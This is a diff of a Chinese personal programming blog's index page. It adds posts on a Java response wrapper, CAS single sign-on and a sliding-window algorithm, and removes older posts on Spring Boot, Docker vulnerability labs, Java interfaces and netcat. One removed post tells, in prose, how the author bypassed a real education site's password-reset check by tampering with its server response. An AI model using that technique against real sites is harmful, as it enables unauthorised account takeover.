this.status = 200;</span><br><span class="line">        this.message = &quot;SUCCESS&quot;;</span><br><span class="line">        this.data = data;</span><br><span class="line">    &#125;</span><br><span class="line">    private ResultMessage(StatusCode statusCode)&#123;</span><br><span class="line">        this.status = statusCode.getStatus();</span><br><span class="line">        this.message = statusCode.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 成功时候的调用</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static &lt;T&gt; ResultMessage&lt;T&gt; success(T data)&#123;</span><br><span class="line">        return new ResultMessage&lt;&gt;(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 成功，不需要传入参数</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">    public static &lt;T&gt; ResultMessage&lt;T&gt; success()&#123;</span><br><span class="line">        return (ResultMessage&lt;T&gt;) success(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * 失败时候的调用</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static &lt;T&gt; ResultMessage&lt;T&gt; error(StatusCode statusCode)&#123;</span><br><span class="line">        return new ResultMessage&lt;T&gt;(statusCode);</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * 失败时候的调用,扩展消息参数</span><br><span class="line">     * @param statusCode</span><br><span class="line">     * @param msg</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static &lt;T&gt; ResultMessage&lt;T&gt; error(StatusCode statusCode,String msg)&#123;</span><br><span class="line">        statusCode.setMessage(statusCode.getMessage().split(&quot;--&quot;)[0] + &quot;--&quot; + msg);</span><br><span class="line">        return new ResultMessage&lt;&gt;(statusCode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public T getData() &#123;</span><br><span class="line">        return data;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getMessage() &#123;</span><br><span class="line">        return message;</span><br><span class="line">    &#125;</span><br><span class="line">    public int getStatus() &#123;</span><br><span class="line">        return this.status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString()&#123;</span><br><span class="line">        return &quot;status: &quot; + this.status + &quot; | message: &quot; + this.message + &quot; | data: &quot; + this.data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h3 id="单点登录"><a href="#单点登录" class="headerlink" title="单点登录"></a>单点登录</h3><p>单点登录（Single Sign-On ,简称SSO),只用户只需在一个地方登录，就能保持登录状态访问所有相互信任的子系统。</p>
+<h3 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h3><p>CAS 为 Central Authentication Service。<br><br>CAS 分为 CAS Server 和 CAS Client.<br></p>
+<ul>
+<li>CAS Server 负责用户的认证和授权</li>
+<li>CAS Client 与受保护的客户端应用部署在一起，负责认证用户是否登录,同时负责处理对客户端受保护资源的访问请求，需要登录时，重定向到CAS Server，以Filter方式保护受保护的资源。</li>
+</ul>
+<h4 id="一-授权与登录操作"><a href="#一-授权与登录操作" class="headerlink" title="一.授权与登录操作"></a>一.授权与登录操作</h4><h6 id="1-未登录时"><a href="#1-未登录时" class="headerlink" title="1.未登录时"></a>1.未登录时</h6><p><img src="http://67.216.218.49:8000/file/blogs/base/cas/cas01.png" alt="cas01"><br>如图:<br></p>
+<ul>
+<li>(1)客户端(即浏览器)请求资源(需要登录的受限资源)，CAS Client发现无权限(未登录，通过cookies中JSESSIONID判断是否登录)，尝试获取ticket(未获取到)。</li>
+<li>(2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)获取ticket，此时ticket不存在(未登录)，返回登录页面。</li>
+<li>(3)客户端进行登录(带上认证信息，原本的请求资源地址，sessionid,sessionid为CAS Client生成)，CAS Server 验证通过，生成与sessionid进行关联的TGT与ST,将请求的cookie中jsessionid设置为传过来的sessionid，并返回重定向(要请求的资源地址，带上ticket(ST))<br><img src="http://67.216.218.49:8000/file/blogs/base/cas/cas_sessionid01.png" alt="cas_session01"><br>将会话的jsessionid设置为图中1.</li>
+<li>(4)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证</li>
+<li>(5)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client(可以理解为服务端) 利用前面设置的JSESSIONID为该用户创建session会话，维护登录状态(JSESSIONID)，并返回原本受限的请求资源</li>
+</ul>
+<h6 id="2-已登录时"><a href="#2-已登录时" class="headerlink" title="2.已登录时"></a>2.已登录时</h6><p>当已登录的用户第一次访问其它互相信任的系统时：<br></p>
+<ul>
+<li>(1)客户端请求资源(需要登录的受限资源)，CAS Client发现无权限(此时该系统还未登录过，session会话未创建)，尝试获取ticket(未获取到)。</li>
+<li>(2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)根据session获取ticket，此时ticket已存在,重定向请求。</li>
+<li>(3)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证，认证成功后设置该域的session.</li>
+<li>(4)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client 为该用户创建session会话，保存在域下的登录状态，返回原本受限的请求资源。</li>
+</ul>
+<h4 id="二-登录状态判断"><a href="#二-登录状态判断" class="headerlink" title="二.登录状态判断"></a>二.登录状态判断</h4><p>已登录的用户在再次请求受限资源时，不能每次都去认证中心(CAS Server)判断是否登录(效率低)。<br><br><img src="http://67.216.218.49:8000/file/blogs/base/cas/cas_cookie01.png" alt="cas01"><br>当一个已经登录过的用户，再次请求该系统资源时，CAS Client会去session中查找用户信息(通过请求头的cookie中JSESSIONID字段的值)，判断是否登录。不用再去CAS Server认证。<br><br>不同的域，各自维护自己的session.<br></p>
+<h4 id="三-退出"><a href="#三-退出" class="headerlink" title="三.退出"></a>三.退出</h4><ul>
+<li>(1)客户端向当前web应用发起退出请求。</li>
+<li>(2)应用取消本地会话session，同时通知CAS Server，用户已登出，清除TGT。</li>
+<li>(3)应用返回客户端登出请求。</li>
+<li>(4)CAS Server 通知所有用户登录访问的应用，用户已登出。</li>
+</ul>
+<h4 id="四-CAS中的ticket"><a href="#四-CAS中的ticket" class="headerlink" title="四.CAS中的ticket"></a>四.CAS中的ticket</h4><ul>
+<li>TGT：TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS 认证成功后，CAS生成cookie，写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT ，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。</li>
+<li>ST：服务票据，ST是CAS为用户签发的访问某一service的票据。用户访问service时，service发现用户没有ST，则要求用户去CAS获取ST。用户向CAS发出获取ST的请求，如果用户的请求中包含cookie，则CAS会以此cookie值为key查询缓存中有无TGT，如果存在TGT，则用此TGT签发一个ST，返回给用户。用户凭借ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源。</li>
+<li>LT: 定制login页面时候，提交以后还是要提交到cas进行验证，那么参数中需要带lt，这个lt必须在前面获取到，防止重复提交之类的作用。</li>
+<li>TGC:在系统A登录成功后，用户和认证中心之间建立起了全局会话，这个全局会话就是TGT(Ticket Granting Ticket)，TGT位于CAS服务器端，TGT并没有放在Session中，也就是说，CAS全局会话的实现并没有直接使用Session机制，而是利用了Cookie自己实现的，这个Cookie叫做TGC(Ticket Granting Cookie)，它存放了TGT的id(jsessionid),保存在用户浏览器上</li>
+</ul>
 
       
 
@@ -433,7 +1179,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">wheels</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">base</a>
         		</li>
       		
 		</ul>
@@ -443,7 +1189,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/03/12/wheels/java/ResultMessage封装/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/05/30/base/cas-sso/cas/">展开全文 >></a>
         </p>
       
 
@@ -473,29 +1219,30 @@
 
 
   
-    <article id="post-security/example/成都安全教育平台/chengdu.xueanquan.com" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-algorithm/sildewindow/manacher" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/12/security/example/成都安全教育平台/chengdu.xueanquan.com/">成都安全教育平台修改密码</a>
+      <a class="article-title" href="/2019/05/29/algorithm/sildewindow/manacher/">滑动窗口解决最长子串问题</a>
     </h1>
   
 
         
-        <a href="/2019/03/12/security/example/成都安全教育平台/chengdu.xueanquan.com/" class="archive-article-date">
-  	<time datetime="2019-03-12T07:54:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-12</time>
+        <a href="/2019/05/29/algorithm/sildewindow/manacher/" class="archive-article-date">
+  	<time datetime="2019-05-29T06:25:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-29</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="1-起因"><a href="#1-起因" class="headerlink" title="1.起因"></a>1.起因</h3><p>今天暂时写完了手上的后端接口，有点时间，想起前几天看见女朋友用的安全教育平台有个密码找回功能。<br><br>喜闻乐见，大家都知道这是个漏洞高发区。刚好去年看过几篇这方面的文章，一直没实践过，今天刚好练习下（我是未入门菜鸟）。</p>
-<h3 id="2-具体过程"><a href="#2-具体过程" class="headerlink" title="2.具体过程"></a>2.具体过程</h3><p>登录页面<br><br>看见这个已运行800天，心里就是一动，多半会成功了。<br><img src="./login.png" alt="登录"><br>密码找回页面<br><br>在这一步需要填一些信息<br><br>首先你要知道自己要改谁的密码，所以这一步的信息默认自己已知<br><img src="./password_back_1.png" alt="back_1"><br>密码找回页面2<br><br>要求在这里输入密保信息进行验证<br><br>由于不知道信息，所以想办法绕过<br><br>首先查看网页源代码，看看有没有逻辑漏洞<br><br><img src="./password_back_2.png" alt="back_2"><br>源代码<br><br>可以看到这里直接通过判断返回值中Result（boolean）来确定有没有验证成功，没有其它限制<br><br>所以首先想到通过拦截返回包，修改返回值<br><img src="./origin_code.png" alt="code"><br>返回包<br><br>将返回包中Result改为true，再发回页面<br><img src="./check.png" alt="check"><br>新密码<br><br>如图,成功跳转到修改密码界面<br><br><img src="./modify.png" alt="modify"></p>
-<p>实际修改密码时返回非法操作，观察发现需要传入一个DesSucuss字段，为48位hash,多次测试，该值不变<br><br>所以猜测为固定字段hash,暂未找到hash方式</p>
+        <h4 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题"></a>1.问题</h4><p>寻找一个字符串中最长不重复的字符串长度。<br><br>(1)通用做法:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for(int i=0; i&lt;len; i++)&#123;</span><br><span class="line">    for(int j=i; j&lt;len; j++)&#123;</span><br><span class="line">      //找到以i开头的最长不重复子串</span><br><span class="line">      if()&#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>(2)用滑动窗口来解决<br></p>
+<h4 id="2-滑动窗口"><a href="#2-滑动窗口" class="headerlink" title="2.滑动窗口"></a>2.滑动窗口</h4><p>原理：<br><br>维护一个长度为right-left的窗口，通过左右边界的收缩与拓展来找到最大长度。<br><br>只需一次遍历，时间复杂度O(n).<br></p>
+<h4 id="3-实现"><a href="#3-实现" class="headerlink" title="3.实现"></a>3.实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int lengthOfLongestSubstring(String s) &#123;</span><br><span class="line">        //滑动窗口</span><br><span class="line">        int left = 0, right = 0;</span><br><span class="line">        int max = 0;</span><br><span class="line">        Set window = new HashSet();</span><br><span class="line">        while(left&lt;s.length() &amp;&amp; right&lt;s.length())&#123;</span><br><span class="line">            if(!window.contains(s.charAt(right)))&#123;</span><br><span class="line">                window.add(s.charAt(right));</span><br><span class="line">                right++;</span><br><span class="line">                //更新最大值</span><br><span class="line">                max = Math.max(max,right-left);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">              //收缩左边界到没有重复为止，</span><br><span class="line">              //按照顺序收缩，例 abcb-&gt;bcb-&gt;cb</span><br><span class="line">                window.remove(s.charAt(left));</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
       
 
@@ -509,7 +1256,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">security</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">algorithm</a>
         		</li>
       		
 		</ul>
@@ -519,436 +1266,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/03/12/security/example/成都安全教育平台/chengdu.xueanquan.com/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/spring/springboot接收参数" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/22/java/spring/springboot接收参数/">springboot Controller 接收参数</a>
-    </h1>
-  
-
-        
-        <a href="/2019/02/22/java/spring/springboot接收参数/" class="archive-article-date">
-  	<time datetime="2019-02-22T02:34:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="一-原因"><a href="#一-原因" class="headerlink" title="一.原因"></a>一.原因</h4><p>一直对springboot前后端交互的传参接参浑浑噩噩，准备仔细梳理一下。</p>
-<h4 id="二-常见注解"><a href="#二-常见注解" class="headerlink" title="二.常见注解"></a>二.常见注解</h4><h6 id="1-PathVariable"><a href="#1-PathVariable" class="headerlink" title="1.@PathVariable"></a>1.@PathVariable</h6><p>用于Get请求<br><br>获取请求url中的值，一般用来接收url/{param}类型的参数<br><br>一般返回类型为json或页面跳转等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get1/123</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get1/&#123;param&#125;&quot;,method = RequestMethod.GET)</span><br><span class="line">public String  get1(@PathVariable(&quot;param&quot;) String param)&#123;</span><br><span class="line">    System.out.println(param);</span><br><span class="line">    return param;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h6 id="2-RequestParam"><a href="#2-RequestParam" class="headerlink" title="2.@RequestParam"></a>2.@RequestParam</h6><p>用于Get/Post都行<br><br>在get请求时  获取请求参数中的值<br><br>参数一般为url后面的param=param(&amp;xx=xx)或者form-data<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get2?param1=param1&amp;param2=param2</span><br><span class="line">@ResponseBody</span><br><span class="line">    @RequestMapping(value = &quot;/get2&quot;, method = RequestMethod.GET)</span><br><span class="line">    public String get2(@RequestParam(&quot;param1&quot;) String param1,</span><br><span class="line">                       @RequestParam(&quot;param2&quot;) String param2)&#123;</span><br><span class="line">        return param1 + param2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<h6 id="3-RequestBody"><a href="#3-RequestBody" class="headerlink" title="3.@RequestBody"></a>3.@RequestBody</h6><p>用于Get/Post都行<br><br>该注解和@RequestParam殊途同归，我们使用该注解将所有参数转换，在代码部分在一个个取出来，也是目前我使用到最多的注解来获取参数<br><br>@RequestBody注解常用来处理content-type不是默认的application/x-www-form-urlcoded编码的内容，比如说：application/json或者是application/xml等。一般情况下来说常用其来处理application/json类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get3</span><br><span class="line">//参数为json: &#123;&quot;param1&quot;:&quot;11&quot;,&quot;param2&quot;: &quot;22&quot;&#125;</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get3&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get3(@RequestBody Map&lt;String,String&gt; param)&#123;</span><br><span class="line">    return param.get(&quot;param1&quot;) + param.get(&quot;param2&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h6 id="4-HttpServletRequest"><a href="#4-HttpServletRequest" class="headerlink" title="4.HttpServletRequest"></a>4.HttpServletRequest</h6><p>get或post<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br>form-data会解析为param=param&amp;xx=xx形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求参数为: http://127.0.0.1:8080/get4?param1=11&amp;param2=22</span><br><span class="line">//或参数为form-data</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get4&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get4(HttpServletRequest request) &#123;</span><br><span class="line">    return request.getParameter(&quot;param1&quot;)+request.getParameter(&quot;param2&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h6 id="5-直接获取"><a href="#5-直接获取" class="headerlink" title="5.直接获取"></a>5.直接获取</h6><p>get请求<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get5&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get4(String param1, String param2) &#123;</span><br><span class="line">    return param1+param2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>######</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/02/22/java/spring/springboot接收参数/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-tools/docker_vulner_install" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/14/tools/docker_vulner_install/">docker搭建漏洞环境</a>
-    </h1>
-  
-
-        
-        <a href="/2019/02/14/tools/docker_vulner_install/" class="archive-article-date">
-  	<time datetime="2019-02-14T03:53:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="1-docker-compose"><a href="#1-docker-compose" class="headerlink" title="1.docker-compose"></a>1.docker-compose</h4><p>pip install docker-compose<br><br>Compose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排,负责快速的部署分布式应用。</p>
-<h4 id="2-git"><a href="#2-git" class="headerlink" title="2.git"></a>2.git</h4><p>git clone <a href="https://github.com/c0ny1/vulstudy.git" target="_blank" rel="noopener">https://github.com/c0ny1/vulstudy.git</a></p>
-<h4 id="3-start"><a href="#3-start" class="headerlink" title="3.start"></a>3.start</h4><h6 id="1-单独运行一个漏洞平台"><a href="#1-单独运行一个漏洞平台" class="headerlink" title="1.单独运行一个漏洞平台"></a>1.单独运行一个漏洞平台</h6><p>cd到要运行的漏洞平台下运行以下命令<br></p>
-<p>cd vulstudy/DVWA<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>
-<h6 id="2-同时运行所有漏洞平台"><a href="#2-同时运行所有漏洞平台" class="headerlink" title="2.同时运行所有漏洞平台"></a>2.同时运行所有漏洞平台</h6><p>在项目根目录下运行以下命令<br></p>
-<p>cd vulstudy<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>
-<h5 id="3-查看信息"><a href="#3-查看信息" class="headerlink" title="3.查看信息"></a>3.查看信息</h5><p>docker-compose ps 查看启动信息<br><br>docker-compose logs 查看日志<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps  </span><br><span class="line">sudo docker exec  -it 9a8(容器id前三位) /bin/sh&lt;br&gt;</span><br><span class="line">进入容器查看/修改</span><br></pre></td></tr></table></figure></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">docker</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/02/14/tools/docker_vulner_install/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/base/interface" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/21/java/base/interface/">接口</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/21/java/base/interface/" class="archive-article-date">
-  	<time datetime="2019-01-21T06:26:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-21</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://blog.csdn.net/u010466329/article/details/78133282" target="_blank" rel="noopener">接口与抽象类区别</a></p>
-<h3 id="一-例子"><a href="#一-例子" class="headerlink" title="一.例子"></a>一.例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package base.interfacedemo;</span><br><span class="line"></span><br><span class="line">//定义一个接口</span><br><span class="line">interface TestInterface &#123;</span><br><span class="line"></span><br><span class="line">    void test();</span><br><span class="line"></span><br><span class="line">    //接口静态内部类实现 默认 public static final</span><br><span class="line">    //方便扩展</span><br><span class="line">    TestInterface Demo1 = new TestInterface() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void test() &#123;</span><br><span class="line">            System.out.println(&quot;test1&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    //default方法 java8新特性</span><br><span class="line">    default void Demo3()&#123;</span><br><span class="line">       System.out.println(&quot;test3&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//正常的接口实现</span><br><span class="line">class Demo2 implements TestInterface&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void test()&#123;</span><br><span class="line">        System.out.println(&quot;test2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class DemoInterface&#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        TestInterface.Demo1.test();</span><br><span class="line">        new Demo2().test();</span><br><span class="line">        Demo2 demo3 = new Demo2();</span><br><span class="line">        demo3.Demo3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/21/java/base/interface/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-security/netcat" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/17/security/netcat/">netcat</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/17/security/netcat/" class="archive-article-date">
-  	<time datetime="2019-01-17T07:19:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>netcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。</p>
